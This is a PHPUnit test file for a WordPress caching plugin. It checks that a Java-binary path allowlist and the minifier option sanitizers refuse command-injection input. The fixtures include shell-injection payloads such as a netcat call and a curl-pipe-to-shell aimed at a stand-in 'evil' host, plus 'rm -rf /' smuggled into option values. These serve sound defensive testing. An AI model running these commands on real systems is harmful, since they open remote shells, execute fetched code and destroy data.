<?php
/**
 * File: class-w3tc-util-java-test.php
 *
 * @package    W3TC
 * @subpackage W3TC/tests/admin
 * @since      X.X.X
 */

declare( strict_types = 1 );

use W3TC\Util_Java;

/**
 * Class: W3tc_Util_Java_Test
 *
 * Unit tests for the Java executable path allowlist and minifier option
 * sanitizers introduced as Layer 1/3 of the command-injection hardening.
 *
 * @since X.X.X
 */
class W3tc_Util_Java_Test extends WP_UnitTestCase {

	/**
	 * Path to a real, executable file that is always under the default
	 * allowlist on Linux (/usr/bin). Resolved once and reused so tests
	 * skip cleanly on platforms where the binary is missing.
	 *
	 * @var string
	 */
	private static $valid_binary = '';

	/**
	 * Resolve a known-good executable path that lives under one of the
	 * default allowed_dirs(). On stock Debian/Ubuntu /usr/bin/env is
	 * always present.
	 *
	 * @return void
	 */
	public static function setUpBeforeClass(): void {
		parent::setUpBeforeClass();

		foreach ( array( '/usr/bin/env', '/usr/bin/true', '/usr/bin/test' ) as $candidate ) {
			$real = realpath( $candidate );
			if ( false !== $real && is_executable( $real ) ) {
				self::$valid_binary = $real;
				break;
			}
		}
	}

	/**
	 * Skip the test when no in-allowlist binary is available (e.g.
	 * non-Linux CI host).
	 *
	 * @return void
	 */
	private function require_valid_binary() {
		if ( '' === self::$valid_binary ) {
			$this->markTestSkipped( 'No allowlisted Java-style binary available on this host.' );
		}
	}

	/**
	 * Non-string / empty inputs must be refused.
	 *
	 * @since X.X.X
	 */
	public function test_validate_rejects_empty_and_non_string() {
		$this->assertFalse( Util_Java::validate( '' ) );
		$this->assertFalse( Util_Java::validate( null ) );
		$this->assertFalse( Util_Java::validate( 0 ) );
		$this->assertFalse( Util_Java::validate( array( '/usr/bin/env' ) ) );
	}

	/**
	 * Shell-metacharacter payloads are refused before realpath() runs.
	 *
	 * @since X.X.X
	 */
	public function test_validate_rejects_shell_metacharacters() {
		$this->require_valid_binary();

		// Each of these is a metacharacter that, if it reached the
		// vendored shell_exec, could split the command line.
		$payloads = array(
			self::$valid_binary . '; id',
			self::$valid_binary . ' | nc evil 1337',
			self::$valid_binary . ' && curl evil/x|sh',
			self::$valid_binary . ' `id`',
			self::$valid_binary . ' $(id)',
			self::$valid_binary . " 'foo'",
			self::$valid_binary . ' "foo"',
			self::$valid_binary . ' >/tmp/out',
			self::$valid_binary . ' <hello',
			self::$valid_binary . ' *',
			self::$valid_binary . ' ?',
		);

		foreach ( $payloads as $payload ) {
			$this->assertFalse(
				Util_Java::validate( $payload ),
				'Expected metacharacter payload to be refused: ' . $payload
			);
		}
	}

	/**
	 * A non-existent path must be refused.
	 *
	 * @since X.X.X
	 */
	public function test_validate_rejects_non_existent_path() {
		$this->assertFalse( Util_Java::validate( '/usr/bin/nope_this_does_not_exist_xyz_w3tc' ) );
	}

	/**
	 * A real file outside the default allowlist (e.g. in /tmp) is
	 * refused even when it canonicalizes and is executable.
	 *
	 * @since X.X.X
	 */
	public function test_validate_rejects_path_outside_allowlist() {
		$tmp = tempnam( sys_get_temp_dir(), 'w3tc-java-test-' );
		$this->assertNotFalse( $tmp );
		chmod( $tmp, 0755 );

		try {
			$this->assertFalse( Util_Java::validate( $tmp ) );
		} finally {
			@unlink( $tmp );
		}
	}

	/**
	 * A real, executable, in-allowlist binary returns its canonical path.
	 *
	 * @since X.X.X
	 */
	public function test_validate_accepts_allowlisted_executable() {
		$this->require_valid_binary();

		$result = Util_Java::validate( self::$valid_binary );
		$this->assertSame( self::$valid_binary, $result );
	}

	/**
	 * validate_with_log() delegates to validate() and returns the same
	 * value (the side-effect is a Util_Debug::log entry on rejection,
	 * which we don't assert on directly here — Util_Debug is best-effort).
	 *
	 * @since X.X.X
	 */
	public function test_validate_with_log_delegates_to_validate() {
		$this->require_valid_binary();

		$this->assertSame(
			self::$valid_binary,
			Util_Java::validate_with_log( self::$valid_binary, 'unit-test' )
		);
		$this->assertFalse(
			Util_Java::validate_with_log( '/no/such/path/w3tc-test', 'unit-test' )
		);
	}

	/**
	 * In the default configuration (no override constant), allowed_dirs()
	 * returns the platform-appropriate default list.
	 *
	 * @since X.X.X
	 */
	public function test_allowed_dirs_returns_defaults() {
		if ( defined( 'W3TC_JAVA_BIN_ALLOWED_DIRS' ) ) {
			$this->markTestSkipped( 'W3TC_JAVA_BIN_ALLOWED_DIRS is already defined; cannot test defaults in-process.' );
		}

		$dirs = Util_Java::allowed_dirs();
		$this->assertIsArray( $dirs );
		$this->assertNotEmpty( $dirs );

		if ( '\\' === DIRECTORY_SEPARATOR ) {
			$this->assertContains( 'C:\\Program Files\\Java', $dirs );
		} else {
			$this->assertContains( '/usr/bin', $dirs );
			$this->assertContains( '/usr/local/bin', $dirs );
			$this->assertContains( '/opt', $dirs );
			// `/usr/bin/java` is a symlink chain on most distros that
			// resolves through `/etc/alternatives/java` under
			// `/usr/lib/jvm`; the realpath-based validator needs the JVM
			// root in the default allowlist or the documented config
			// fails on every stock install.
			$this->assertContains( '/usr/lib/jvm', $dirs );
		}
	}

	/**
	 * The override constant is parsed with PHP's PATH_SEPARATOR, so a
	 * Windows drive letter (`C:\Java\bin`) is not split on its own colon.
	 *
	 * The constant is process-scoped — define()'d once for the lifetime of
	 * the PHP worker — so this test runs in an isolated process.
	 *
	 * @runInSeparateProcess
	 * @preserveGlobalState disabled
	 * @since X.X.X
	 */
	public function test_allowed_dirs_override_constant_uses_path_separator() {
		$override = '/opt/openjdk-17/bin' . PATH_SEPARATOR . '/usr/lib/jvm/java-17/bin';
		define( 'W3TC_JAVA_BIN_ALLOWED_DIRS', $override );

		// The isolated subprocess re-bootstraps the test suite; pull the
		// autoload again so we can reference the namespaced class.
		require_once dirname( __DIR__, 2 ) . '/Util_Java.php';

		$dirs = \W3TC\Util_Java::allowed_dirs();
		$this->assertSame(
			array( '/opt/openjdk-17/bin', '/usr/lib/jvm/java-17/bin' ),
			$dirs
		);
	}

	/**
	 * Whitespace around override entries is trimmed and empty segments
	 * are dropped — `:a::b:` becomes `[a, b]`.
	 *
	 * @runInSeparateProcess
	 * @preserveGlobalState disabled
	 * @since X.X.X
	 */
	public function test_allowed_dirs_override_trims_and_drops_empties() {
		$override = PATH_SEPARATOR . '  /opt/a  ' . PATH_SEPARATOR . PATH_SEPARATOR . '/opt/b';
		define( 'W3TC_JAVA_BIN_ALLOWED_DIRS', $override );

		require_once dirname( __DIR__, 2 ) . '/Util_Java.php';

		$this->assertSame(
			array( '/opt/a', '/opt/b' ),
			\W3TC\Util_Java::allowed_dirs()
		);
	}

	/**
	 * sanitize_ccjs_options() filters compilation_level against the
	 * documented enum and drops anything else.
	 *
	 * @since X.X.X
	 */
	public function test_sanitize_ccjs_options_filters_compilation_level() {
		$out = Util_Java::sanitize_ccjs_options(
			array(
				'compilation_level' => 'SIMPLE_OPTIMIZATIONS',
				'formatting'        => 'pretty_print',
			)
		);
		$this->assertSame( 'SIMPLE_OPTIMIZATIONS', $out['compilation_level'] );
		$this->assertSame( 'pretty_print', $out['formatting'] );

		$out = Util_Java::sanitize_ccjs_options(
			array(
				'compilation_level' => 'EVIL; rm -rf /',
				'formatting'        => '<script>',
			)
		);
		$this->assertArrayNotHasKey( 'compilation_level', $out );
		$this->assertArrayNotHasKey( 'formatting', $out );
	}

	/**
	 * sanitize_yui_options() coerces numeric line-break to an integer
	 * and forwards boolean toggles as bool.
	 *
	 * @since X.X.X
	 */
	public function test_sanitize_yui_options_coerces_types() {
		$out = Util_Java::sanitize_yui_options(
			array(
				'line-break'            => '80; rm -rf /',
				'nomunge'               => 1,
				'preserve-semi'         => 'yes',
				'disable-optimizations' => 0,
				'rogue-option'          => 'should be dropped',
			)
		);

		// '80; rm -rf /' isn't numeric → dropped.
		$this->assertArrayNotHasKey( 'line-break', $out );
		$this->assertSame( true, $out['nomunge'] );
		$this->assertSame( true, $out['preserve-semi'] );
		$this->assertSame( false, $out['disable-optimizations'] );
		$this->assertArrayNotHasKey( 'rogue-option', $out );

		$out = Util_Java::sanitize_yui_options( array( 'line-break' => 80 ) );
		$this->assertSame( 80, $out['line-break'] );
	}
}
